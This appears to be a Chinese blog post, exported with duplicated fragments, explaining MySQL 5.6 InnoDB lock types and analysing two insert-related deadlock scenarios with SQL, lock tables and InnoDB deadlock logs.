'PRIMARY'\n\n\n#### 事务锁占用情况\nT1 rollback前，各事务锁占用情况：\n``` bash\nmysql> select * from information_schema.innodb_locks;\n+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+\n| lock_id      | lock_trx_id | lock_mode | lock_type | lock_table  | lock_index | lock_space | lock_page | lock_rec | lock_data |\n+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+\n| 36729:24:3:7 | 36729       | S         | RECORD    | `test`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |\n| 36727:24:3:7 | 36727       | X         | RECORD    | `test`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |\n| 36728:24:3:7 | 36728       | S         | RECORD    | `test`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |\n+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+\n```\n\n**注**：mysql有自己的一套规则来决定T2与T3哪个进行回滚，本文不做讨论。\n\n\n#### 死锁日志\n``` bash\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n2016-07-21 19:34:23 700000a3f000\n*** (1) TRANSACTION:\nTRANSACTION 36728, ACTIVE 199 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 4 lock struct(s), heap size 1184, 2 row lock(s)\nMySQL thread id 13, OS thread handle 0x700000b0b000, query id 590 localhost root update\ninsert into aa values(6, 'test', 12, 3)\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `test`.`aa` trx id 36728 lock_mode X insert intention waiting\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n\n*** (2) TRANSACTION:\nTRANSACTION 36729, ACTIVE 196 sec inserting\nmysql tables in use 1, locked 1\n4 lock struct(s), heap size 1184, 2 row lock(s)\nMySQL thread id 14, OS thread handle 0x700000a3f000, query id 591 localhost root update\ninsert into aa values(6, 'test', 12, 3)\n*** (2) HOLDS THE LOCK(S):\nRECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `test`.`aa` trx id 36729 lock mode S\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n\n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `test`.`aa` trx id 36729 lock_mode X insert intention waiting\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n\n*** WE ROLL BACK TRANSACTION (2)\n```\n\n\n#### 死锁成因\n事务T1成功插入记录，并获得索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)。\n紧接着事务T2、T3也开始插入记录，请求排他插入意向锁(LOCK_X | LOCK_GAP | LOCK_INSERT_INTENTION)；但由于发生重复唯一键冲突，各自请求的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)转成共享记录锁(LOCK_S | LOCK_REC_NOT_GAP)。\n\nT1回滚释放索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)，T2和T3都要请求索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)。\n由于X锁与S锁互斥，T2和T3都等待对方释放S锁。\n于是，死锁便产生了。\n\n如果此场景下，只有两个事务T1与T2或者T1与T3，则不会引发如上死锁情况产生。\n\n\n#### 思考\n- 为什么发现重复主键冲突的时候，要将事务请求的X锁转成S锁？\n(比较牵强的)个人理解，跟插入意向锁类型，也是为了提高插入的并发效率。\n\n- 插入前请求插入意向锁的作用？\n个人认为，通过兼容矩阵来分析，Insert Intention Locks是为了减少插入时的锁冲突。\n\n\n### 2. GAP与Insert Intention冲突引发的死锁\n\n\n#### 表结构\n``` sql\nCREATE TABLE `t` (\n  `a` int(11) NOT NULL,\n  `b` int(11) DEFAULT NULL,\n  PRIMARY KEY (`a`),\n  KEY `idx_b` (`b`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\n\n#### 表数据\n``` bash\nmysql> select * from t;\n+----+------+\n| a  | b    |\n+----+------+\n|  1 |    2 |\n|  2 |    3 |\n|  3 |    4 |\n| 11 |   22 |\n+----+------+\n```\n\n\n#### 事务执行时序表\n| T1(36831) | T2(36832) |\n|---|---|---|\n| begin; | begin; |\n| select * from t where b = 6 for update; | |\n| | select * from t where b = 8 for update; |\n| insert into t values (4,5); | |\n| | insert into t values (4,5); |\n| | ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction |\n| Query OK, 1 row affected (5.45 sec) | &nbsp; |\n\n\n#### 事务锁占用情况\nT2 insert前，各事务锁占用情况：\n``` bash\nmysql> select * from information_schema.innodb_locks;\n+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+\n| lock_id      | lock_trx_id | lock_mode | lock_type | lock_table | lock_index | lock_space | lock_page | lock_rec | lock_data |\n+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+\n| 36831:25:4:5 | 36831       | X,GAP     | RECORD    | `test`.`t` | idx_b      |         25 |         4 |        5 | 22, 11    |\n| 36832:25:4:5 | 36832       | X,GAP     | RECORD    | `test`.`t` | idx_b      |         25 |         4 |        5 | 22, 11    |\n+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+\n```\n\n\n#### 死锁日志\n```\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n2016-07-28 12:28:34 700000a3f000\n*** (1) TRANSACTION:\nTRANSACTION 36831, ACTIVE 17 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 4 lock struct(s), heap size 1184, 3 row lock(s), undo log entries 1\nMySQL thread id 38, OS thread handle 0x700000b0b000, query id 953 localhost root update\ninsert into t values (4,5)\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 25 page no 4 n bits 72 index `idx_b` of table `test`.`t` trx id 36831 lock_mode X locks gap before rec insert intention waiting\nRecord lock, heap no 5 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000016; asc     ;;\n 1: len 4; hex 8000000b; asc     ;;\n\n*** (2) TRANSACTION:\nTRANSACTION 36832, ACTIVE 13 sec inserting\nmysql tables in use 1, locked 1\n3 lock struct(s), heap size 360, 2 row lock(s)\nMySQL thread id 39, OS thread handle 0x700000a3f000, query id 954 localhost root update\ninsert into t values (4,5)\n*** (2) HOLDS THE LOCK(S):\nRECORD LOCKS space id 25 page no 4 n bits 72 index `idx_b` of table `test`.`t` trx id 36832 lock_mode X locks gap before rec\nRecord lock, heap no 5 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000016; asc     ;;\n 1: len 4; hex 8000000b; asc     ;;\n\n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 25 page no 3 n bits 72 index `PRIMARY` of table `test`.`t` trx id 36832 lock mode S locks rec but not gap waiting\nRecord lock, heap no 5 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 80000004; asc     ;;\n 1: len 6; hex 000000008fdf; asc       ;;\n 2: len 7; hex 8d000001d00110; asc        ;;\n 3: len 4; hex 80000005; asc     ;;\n\n*** WE ROLL BACK TRANSACTION (2)\n```\n\n\n#### 死锁成因\n事务T1执行查询语句，在索引b=6上加排他Next-key锁(LOCK_X | LOCK_ORDINARY)，会锁住idx_b索引范围(4, 22)。\n事务T2执行查询语句，在索引b=8上加排他Next-key锁(LOCK_X | LOCK_ORDINARY)，会锁住idx_b索引范围(4, 22)。由于请求的GAP与已持有的GAP是兼容的，因此，事务T2在idx_b索引范围(4, 22)也能加锁成功。\n\n事务T1执行插入语句，会先加排他Insert Intention锁。由于请求的Insert Intention锁与已有的GAP锁不兼容，则事务T1等待T2释放GAP锁。\n事务T2执行插入语句，也会等待T1释放GAP锁。\n于是，死锁便产生了。\n\n**注**：LOCK_ORDINARY拥有LOCK_GAP一部分特性。\n\n\n#### 思考：Insert Intention锁在加哪级索引上？\n这个排他锁加在PK上，还是二级索引上？\n\n\n## 六、课后思考\n1. 无主键的加锁过程\n无PK时，会创建一个隐式聚簇索引。加锁在这个隐式聚簇索引会有什么不同？\n\n2. 复合索引加锁过程\n3. 多条件(where condition)加锁过程\n4. 隐式锁与显式锁，隐式锁什么情况下会转换成显式锁\n\n5. 如果插入意向锁不阻止任何锁，这个锁还有必要存在吗？\n目前看到的作用是，通过加锁的方式来唤醒等待线程。\n但这并不意味着，被唤醒后可以直接做插入操作了。需要再次判断是否有锁冲突。\n\n\n## 七、补充知识\n\n### 1. 查看事务隔离级别\nSELECT @@global.tx_isolation;\nSELECT @@session.tx_isolation;\nSELECT @@tx_isolation;\n\n### 2. 设置隔离级别\nSET [SESSION | GLOBAL] TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE}\n例如：set session transaction isolation level read uncommitted;\n\n### 3. 查看auto_increment机制模式\nshow variables like 'innodb_autoinc_lock_mode';\n\n### 4. 查看表状态\nshow table status like 'plan_branch'\\G;\nshow table status from test like 'plan_branch'\\G;\n\n### 5. 查看SQL性能\nshow profiles\nshow profile for query 1;\n\n### 6. 查看当前最新事务ID\n每开启一个新事务，记录当前最新事务的id，可用于后续死锁分析。\nshow engine innodb status\\G;\n\n### 7. 查看事务锁等待状态情况\nselect * from information_schema.innodb_locks;\nselect * from information_schema.innodb_lock_waits;\nselect * from information_schema.innodb_trx;\n\n### 8. 查看innodb状态(包含最近的死锁日志)\nshow engine innodb status;\n\n\n## 八、参考文档\n[^1]: [InnoDB Startup Options and System Variables](https://dev.mysql.com/doc/refman/5.6/en/innodb-parameters.html)\n[^2]: [InnoDB Locking](http://dev.mysql.com/doc/refman/5.6/en/innodb-locking.html)\n[^3]: [Clustered and Secondary Indexes](http://dev.mysql.com/doc/refman/5.6/en/innodb-index-types.html)\n[^4]: [[MySQL] gap lock/next-key lock浅析](http://www.cnblogs.com/renolei/p/4673842.html)\n[^5]: [Intention Lock是否表级锁](http://hedengcheng.com/?p=771#comment-5543)\n[^6]: [Locks Set by Different SQL Statements in InnoDB](http://dev.mysql.com/doc/refman/5.6/en/innodb-locks-set.html)\n[^7]: [一个Mysql的死锁现象，及复现过程](http://feiyang21687.github.io/Mysql-Transaction/)\n[^8]: [AUTO_INCREMENT lock Handing in InnoDB](http://www.cnblogs.com/renolei/p/5559135.html)\n[^9]: [深入理解innodb的锁(record,gap,Next-Key lock)](http://blog.csdn.net/cug_jiang126com/article/details/50596729)\n[^10]: [information_schema中Innodb相关表用于分析sql查询锁的使用情况介绍](http://blog.csdn.net/and1kaney/article/details/51213979)\n[^11]: [The INFORMATION_SCHEMA INNODB_LOCKS Table](http://dev.mysql.com/doc/refman/5.5/en/innodb-locks-table.html)\n[^12]: [The INFORMATION_SCHEMA INNODB_TRX Table](http://dev.mysql.com/doc/refman/5.5/en/innodb-trx-table.html)\n[^13]: [mysql innodb插入意向锁](http://blog.csdn.net/yanzongshuai/article/details/46398609)\n\n","source":"_posts/article/database/mysql insert锁机制.md","raw":"title: mysql insert锁机制\ntags:\n  - mysql\n  - innodb\ncategories:\n  - 数据存储\ndate: 2016-07-28 10:05:00\n---\n<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n## 一、前言\n上周遇到一个因insert而引发的死锁问题，其成因比较令人费解。\n于是想要了解一下insert加锁机制，但是发现网上介绍的文章比较少且零散，挖掘过程比较忙乱。\n\n本以为只需要系统学习一个较完全的逻辑，但是实际牵扯很多innodb锁相关知识及加锁方式。我好像并没有那么大的能耐，把各种场景的加锁过程一一列举并加之分析；亦没有太多的精力验证网上的言论的准确性。\n\n只好根据现在了解的内容，参考官方文档，说说自己当前的理解。\n本文仅供参考，如有误导，概不负责。\n\n\n## 二、现场状态\n不同的mysql版本，不同的参数设置，都可能对加锁过程有影响。\n分析加锁机制还是应当尽可能多地列举一下关键参数，例如：当前mysql版本、事务隔离级别等。\n如下，仅仅只列出个别比较重要的参数。\n\n### 1.数据库版本\n``` bash\nmysql> select version();\n+-----------+\n| version() |\n+-----------+\n| 5.6.27    |\n+-----------+\n```\n\n### 2. 数据库引擎\n``` bash\nmysql> show variables like '%engine%';\n+----------------------------+--------+\n| Variable_name              | Value  |\n+----------------------------+--------+\n| default_storage_engine     | InnoDB |\n| default_tmp_storage_engine | InnoDB |\n| storage_engine             | InnoDB |\n+----------------------------+--------+\n```\n\n**注**：InnoDB支持事务，Myisam不支持事务；InnoDB支持行锁和表锁；Myisam不支持行锁。\n\n### 3. 事务隔离级别\n``` bash\nmysql> select @@global.tx_isolation, @@session.tx_isolation, @@tx_isolation;\n+-----------------------+------------------------+-----------------+\n| @@global.tx_isolation | @@session.tx_isolation | @@tx_isolation  |\n+-----------------------+------------------------+-----------------+\n| REPEATABLE-READ       | REPEATABLE-READ        | REPEATABLE-READ |\n+-----------------------+------------------------+-----------------+\n```\n\n**注**：几种事务隔离级别：READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE\n\n### 4. 查看gap锁开启状态\n``` bash\nmysql> show variables like 'innodb_locks_unsafe_for_binlog';\n+--------------------------------+-------+\n| Variable_name                  | Value |\n+--------------------------------+-------+\n| innodb_locks_unsafe_for_binlog | OFF   |\n+--------------------------------+-------+\n```\n\ninnodb_locks_unsafe_for_binlog：默认值为0，即启用gap lock。\n最主要的作用就是控制innodb是否对gap加锁。\n但是，这一设置变更并不影响外键和唯一索引（含主键）对gap进行加锁的需要。\n开启innodb_locks_unsafe_for_binlog的REPEATABLE-READ事务隔离级别，很大程度上已经蜕变成了READ-COMMITTED。\n\n参见官方文档[^1]：\n> By default, the value of innodb_locks_unsafe_for_binlog is 0 (disabled), which means that gap locking is enabled: InnoDB uses next-key locks for searches and index scans. To enable the variable, set it to 1. This causes gap locking to be disabled: InnoDB uses only index-record locks for searches and index scans.\n\n> Enabling innodb_locks_unsafe_for_binlog does not disable the use of gap locking for foreign-key constraint checking or duplicate-key checking.\n\n> The effect of enabling innodb_locks_unsafe_for_binlog is similar to but not identical to setting the transaction isolation level to READ COMMITTED.\n\n\n### 5. 查看自增锁模式\n``` bash\nmysql> show variables like 'innodb_autoinc_lock_mode';\n+--------------------------+-------+\n| Variable_name            | Value |\n+--------------------------+-------+\n| innodb_autoinc_lock_mode | 1     |\n+--------------------------+-------+\n```\n\ninnodb_autoinc_lock_mode有3种配置模式：0、1、2，分别对应\"传统模式\", \"连续模式\", \"交错模式\"。[^8]\n传统模式：涉及auto-increment列的插入语句加的表级AUTO-INC锁，只有插入执行结束后才会释放锁。这是一种兼容MySQL 5.1之前版本的策略。\n连续模式：可以事先确定插入行数的语句(包括单行和多行插入)，分配连续的确定的auto-increment值；对于插入行数不确定的插入语句，仍加表锁。这种模式下，事务回滚，auto-increment值不会回滚，换句话说，自增列内容会不连续。\n交错模式：同一时刻多条SQL语句产生交错的auto-increment值。\n\n由于insert语句常常涉及自增列的加锁过程，会涉及到AUTO-INC Locks加锁过程。\n为了分步了解insert加锁过程，本文暂不讨论任何涉及自增列的加锁逻辑。\n这一参数设置相关内容可能会出现在我的下一篇文章里。\n\n<!-- more -->\n\n### n. etc\n相关的参数配置越详情越好。\n\n\n## 三、InnoDB锁类型[^2]\n\n### 1. 基本锁\n基本锁：共享锁(Shared Locks：S锁)与排他锁(Exclusive Locks：X锁)\n\nmysql允许拿到S锁的事务读一行，允许拿到X锁的事务更新或删除一行。\n加了S锁的记录，允许其他事务再加S锁，不允许其他事务再加X锁；\n加了X锁的记录，不允许其他事务再加S锁或者X锁。\n\nmysql对外提供加这两种锁的语法如下：\n加S锁：select...lock in share mode\n加X锁：select...for update\n\n### 2. 意向锁(Intention Locks)\nInnoDB为了支持多粒度(表锁与行锁)的锁并存，引入意向锁。\n意向锁是表级锁，可分为意向共享锁(IS锁)和意向排他锁(IX锁)。\n> InnoDB supports multiple granularity locking which permits coexistence of row-level locks and locks on entire tables. To make locking at multiple granularity levels practical, additional types of locks called intention locks are used. Intention locks are table-level locks in InnoDB that indicate which type of lock (shared or exclusive) a transaction will require later for a row in that table. There are two types of intention locks used in InnoDB (assume that transaction T has requested a lock of the indicated type on table t):\n> Intention shared (IS): Transaction T intends to set S locks on individual rows in table t.\n> Intention exclusive (IX): Transaction T intends to set X locks on those rows.\n\n\n事务在请求S锁和X锁前，需要先获得对应的IS、IX锁。\n> Before a transaction can acquire an S lock on a row in table t, it must first acquire an IS or stronger lock on t. Before a transaction can acquire an X lock on a row, it must first acquire an IX lock on t.\n\n\n意向锁产生的主要目的是为了处理行锁和表锁之间的冲突，用于表明“某个事务正在某一行上持有了锁，或者准备去持有锁”。\n> The main purpose of IX and IS locks is to show that someone is locking a row, or going to lock a row in the table.\n\n\n共享锁、排他锁与意向锁的兼容矩阵如下：\n\n| | X | IX | S | IS |\n|:---:|:---:|:---:|:---:|:---:|\n| X | `冲突` | `冲突` | `冲突` | `冲突` |\n| IX | `冲突` | 兼容 | `冲突` | 兼容 |\n| S | `冲突` | `冲突` | 兼容 | 兼容 |\n| IS | `冲突` | 兼容 | 兼容 | 兼容 |\n\n#### 思考\n从官方文档字面意思上看意向锁是表级锁，但是大牛**不认为**“Intention lock 是表级锁”[^5]?\n另外，由于意向锁主要用于解决行锁与表锁间冲突问题，鉴于平时表级操作特别少，在分析加锁过程是否可以不用过多考虑意向锁的问题?\n\n\n### 3. 行锁\n\n#### 记录锁(Record Locks)\n记录锁, 仅仅锁住索引记录的一行。\n单条索引记录上加锁，record lock锁住的永远是索引，而非记录本身，即使该表上没有任何索引，那么innodb会在后台创建一个隐藏的聚集主键索引，那么锁住的就是这个隐藏的聚集主键索引。所以说当一条sql没有走任何索引时，那么将会在每一条聚集索引后面加X锁，这个类似于表锁，但原理上和表锁应该是完全不同的。\n\n参见官方文档[^3]：\n> If the table has no PRIMARY KEY or suitable UNIQUE index, InnoDB internally generates a hidden clustered index on a synthetic column containing row ID values. The rows are ordered by the ID that InnoDB assigns to the rows in such a table. The row ID is a 6-byte field that increases monotonically as new rows are inserted. Thus, the rows ordered by the row ID are physically in insertion order.\n\n\n#### 间隙锁(Gap Locks)\n区间锁, 仅仅锁住一个索引区间(开区间)。\n在索引记录之间的间隙中加锁，或者是在某一条索引记录之前或者之后加锁，并不包括该索引记录本身。\n\n\n#### next-key锁(Next-Key Locks)\nrecord lock + gap lock, 左开右闭区间。\n> A next-key lock is a combination of a record lock on the index record and a gap lock on the gap before the index record.\n\n> By default, InnoDB operates in REPEATABLE READ transaction isolation level and with the innodb_locks_unsafe_for_binlog system variable disabled. In this case, InnoDB uses next-key locks for searches and index scans, which prevents phantom rows。\n\n默认情况下，innodb使用next-key locks来锁定记录。\n但当查询的索引含有唯一属性的时候，Next-Key Lock 会进行优化，将其降级为Record Lock，即仅锁住索引本身，不是范围。\n\n\n#### 插入意向锁(Insert Intention Locks)\nGap Lock中存在一种插入意向锁（Insert Intention Lock），在insert操作时产生。在多事务同时写入不同数据至同一索引间隙的时候，并不需要等待其他事务完成，不会发生锁等待。\n假设有一个记录索引包含键值4和7，不同的事务分别插入5和6，每个事务都会产生一个加在4-7之间的插入意向锁，获取在插入行上的排它锁，但是不会被互相锁住，因为数据行并不冲突。\n\n> An insert intention lock is a type of gap lock set by INSERT operations prior to row insertion. This lock signals the intent to insert in such a way that multiple transactions inserting into the same index gap need not wait for each other if they are not inserting at the same position within the gap. Suppose that there are index records with values of 4 and 7. Separate transactions that attempt to insert values of 5 and 6, respectively, each lock the gap between 4 and 7 with insert intention locks prior to obtaining the exclusive lock on the inserted row, but do not block each other because the rows are nonconflicting.\n\n**注**：插入意向锁并非意向锁，而是一种特殊的间隙锁。\n\n### 4. 行锁的兼容矩阵[^4]\n| | Gap | Insert Intention| Record  | Next-Key |\n|---|---|---|---|---|\n| **Gap** | 兼容 | 兼容 | 兼容 | 兼容 |\n| **Insert Intention** | `冲突` | 兼容 | 兼容 | `冲突` |\n| **Record** | 兼容 | 兼容 | `冲突` | `冲突` |\n| **Next-Key** | 兼容 | 兼容 | `冲突` | `冲突` |\n\n**表注**：横向是已经持有的锁，纵向是正在请求的锁。\n\n由于S锁和S锁是完全兼容的，因此在判别兼容性时只考虑持有的锁与请求的锁是这三种组合情形：X、S和S、X和X、X。\n另外，需要提醒注意的是进行兼容判断也只是针对于加锁涉及的行有交集的情形。\n\n分析兼容矩阵可以得出如下几个结论：\n- INSERT操作之间不会有冲突。\n- GAP,Next-Key会阻止Insert。\n- GAP和Record,Next-Key不会冲突\n- Record和Record、Next-Key之间相互冲突。\n- 已有的Insert锁不阻止任何准备加的锁。\n\n\n### 5. 自增锁(AUTO-INC Locks)\nAUTO-INC锁是一种特殊的表级锁，发生涉及AUTO_INCREMENT列的事务性插入操作时产生。\n\n官方解释如下[^3]：\n> An AUTO-INC lock is a special table-level lock taken by transactions inserting into tables with AUTO_INCREMENT columns. In the simplest case, if one transaction is inserting values into the table, any other transactions must wait to do their own inserts into that table, so that rows inserted by the first transaction receive consecutive primary key values.\n\n## 四、insert加锁过程\n官方文档[^6]对于insert加锁的描述如下：\n> INSERT sets an exclusive lock on the inserted row. This lock is an index-record lock, not a next-key lock (that is, there is no gap lock) and does not prevent other sessions from inserting into the gap before the inserted row.\n\n> Prior to inserting the row, a type of gap lock called an insert intention gap lock is set. This lock signals the intent to insert in such a way that multiple transactions inserting into the same index gap need not wait for each other if they are not inserting at the same position within the gap. Suppose that there are index records with values of 4 and 7. Separate transactions that attempt to insert values of 5 and 6 each lock the gap between 4 and 7 with insert intention locks prior to obtaining the exclusive lock on the inserted row, but do not block each other because the rows are nonconflicting.\n\n> If a duplicate-key error occurs, a shared lock on the duplicate index record is set. This use of a shared lock can result in deadlock should there be multiple sessions trying to insert the same row if another session already has an exclusive lock.\n\n简单的insert会在insert的行对应的索引记录上加一个排它锁，这是一个record lock，并没有gap，所以并不会阻塞其他session在gap间隙里插入记录。\n\n不过在insert操作之前，还会加一种锁，官方文档称它为insertion intention gap lock，也就是意向的gap锁。这个意向gap锁的作用就是预示着当多事务并发插入相同的gap空隙时，只要插入的记录不是gap间隙中的相同位置，则无需等待其他session就可完成，这样就使得insert操作无须加真正的gap lock。\n假设有一个记录索引包含键值4和7，不同的事务分别插入5和6，每个事务都会产生一个加在4-7之间的插入意向锁，获取在插入行上的排它锁，但是不会被互相锁住，因为数据行并不冲突。\n\n假设发生了一个唯一键冲突错误，那么将会在重复的索引记录上加读锁。当有多个session同时插入相同的行记录时，如果另外一个session已经获得该行的排它锁，那么将会导致死锁。\n\n\n### 思考：Insert Intention Locks作用\nInsert Intention Locks的引入，我理解是为了提高数据插入的并发能力。\n如果没有Insert Intention Locks的话，可能就需要使用Gap Locks来代替。\n\n\n## 五、insert死锁场景分析\n接下来，带大家看几个与insert相关的死锁场景。\n\n### 1. duplicate key error引发的死锁\n这个场景主要发生在两个以上的事务同时进行唯一键值相同的记录插入操作。\n\n\n#### 表结构\n``` sql\nCREATE TABLE `aa` (\n  `id` int(10) unsigned NOT NULL COMMENT '主键',\n  `name` varchar(20) NOT NULL DEFAULT '' COMMENT '姓名',\n  `age` int(11) NOT NULL DEFAULT '0' COMMENT '年龄',\n  `stage` int(11) NOT NULL DEFAULT '0' COMMENT '关卡数',\n  PRIMARY KEY (`id`),\n  UNIQUE KEY `udx_name` (`name`),\n  KEY `idx_stage` (`stage`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\n\n#### 表数据\n``` bash\nmysql> select * from aa;\n+----+------+-----+-------+\n| id | name | age | stage |\n+----+------+-----+-------+\n|  1 | yst  |  11 |     8 |\n|  2 | dxj  |   7 |     4 |\n|  3 | lb   |  13 |     7 |\n|  4 | zsq  |   5 |     7 |\n|  5 | lxr  |  13 |     4 |\n+----+------+-----+-------+\n```\n\n\n#### 事务执行时序表\n| T1(36727) | T2(36728) | T3(36729) |\n|---|---|---|\n| begin; | begin; | begin; |\n| insert into aa values(6, 'test', 12, 3); | | |\n| | insert into aa values(6, 'test', 12, 3); | |\n| | | insert into aa values(6, 'test', 12, 3); |\n| rollback; | | |\n| | | ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction |\n| | Query OK, 1 row affected (13.10 sec) | &nbsp; |\n\n如果T1未rollback，而是commit的话，T2和T3会报唯一键冲突：ERROR 1062 (23000): Duplicate entry '6' for key 'PRIMARY'\n\n\n#### 事务锁占用情况\nT1 rollback前，各事务锁占用情况：\n``` bash\nmysql> select * from information_schema.innodb_locks;\n+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+\n| lock_id      | lock_trx_id | lock_mode | lock_type | lock_table  | lock_index | lock_space | lock_page | lock_rec | lock_data |\n+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+\n| 36729:24:3:7 | 36729       | S         | RECORD    | `test`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |\n| 36727:24:3:7 | 36727       | X         | RECORD    | `test`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |\n| 36728:24:3:7 | 36728       | S         | RECORD    | `test`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |\n+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+\n```\n\n**注**：mysql有自己的一套规则来决定T2与T3哪个进行回滚，本文不做讨论。\n\n\n#### 死锁日志\n``` bash\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n2016-07-21 19:34:23 700000a3f000\n*** (1) TRANSACTION:\nTRANSACTION 36728, ACTIVE 199 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 4 lock struct(s), heap size 1184, 2 row lock(s)\nMySQL thread id 13, OS thread handle 0x700000b0b000, query id 590 localhost root update\ninsert into aa values(6, 'test', 12, 3)\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `test`.`aa` trx id 36728 lock_mode X insert intention waiting\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n\n*** (2) TRANSACTION:\nTRANSACTION 36729, ACTIVE 196 sec inserting\nmysql tables in use 1, locked 1\n4 lock struct(s), heap size 1184, 2 row lock(s)\nMySQL thread id 14, OS thread handle 0x700000a3f000, query id 591 localhost root update\ninsert into aa values(6, 'test', 12, 3)\n*** (2) HOLDS THE LOCK(S):\nRECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `test`.`aa` trx id 36729 lock mode S\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n\n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `test`.`aa` trx id 36729 lock_mode X insert intention waiting\nRecord lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0\n 0: len 8; hex 73757072656d756d; asc supremum;;\n\n*** WE ROLL BACK TRANSACTION (2)\n```\n\n\n#### 死锁成因\n事务T1成功插入记录，并获得索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)。\n紧接着事务T2、T3也开始插入记录，请求排他插入意向锁(LOCK_X | LOCK_GAP | LOCK_INSERT_INTENTION)；但由于发生重复唯一键冲突，各自请求的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)转成共享记录锁(LOCK_S | LOCK_REC_NOT_GAP)。\n\nT1回滚释放索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)，T2和T3都要请求索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)。\n由于X锁与S锁互斥，T2和T3都等待对方释放S锁。\n于是，死锁便产生了。\n\n如果此场景下，只有两个事务T1与T2或者T1与T3，则不会引发如上死锁情况产生。\n\n\n#### 思考\n- 为什么发现重复主键冲突的时候，要将事务请求的X锁转成S锁？\n(比较牵强的)个人理解，跟插入意向锁类型，也是为了提高插入的并发效率。\n\n- 插入前请求插入意向锁的作用？\n个人认为，通过兼容矩阵来分析，Insert Intention Locks是为了减少插入时的锁冲突。\n\n\n### 2. GAP与Insert Intention冲突引发的死锁\n\n\n#### 表结构\n``` sql\nCREATE TABLE `t` (\n  `a` int(11) NOT NULL,\n  `b` int(11) DEFAULT NULL,\n  PRIMARY KEY (`a`),\n  KEY `idx_b` (`b`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\n\n#### 表数据\n``` bash\nmysql> select * from t;\n+----+------+\n| a  | b    |\n+----+------+\n|  1 |    2 |\n|  2 |    3 |\n|  3 |    4 |\n| 11 |   22 |\n+----+------+\n```\n\n\n#### 事务执行时序表\n| T1(36831) | T2(36832) |\n|---|---|---|\n| begin; | begin; |\n| select * from t where b = 6 for update; | |\n| | select * from t where b = 8 for update; |\n| insert into t values (4,5); | |\n| | insert into t values (4,5); |\n| | ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction |\n| Query OK, 1 row affected (5.45 sec) | &nbsp; |\n\n\n#### 事务锁占用情况\nT2 insert前，各事务锁占用情况：\n``` bash\nmysql> select * from information_schema.innodb_locks;\n+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+\n| lock_id      | lock_trx_id | lock_mode | lock_type | lock_table | lock_index | lock_space | lock_page | lock_rec | lock_data |\n+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+\n| 36831:25:4:5 | 36831       | X,GAP     | RECORD    | `test`.`t` | idx_b      | 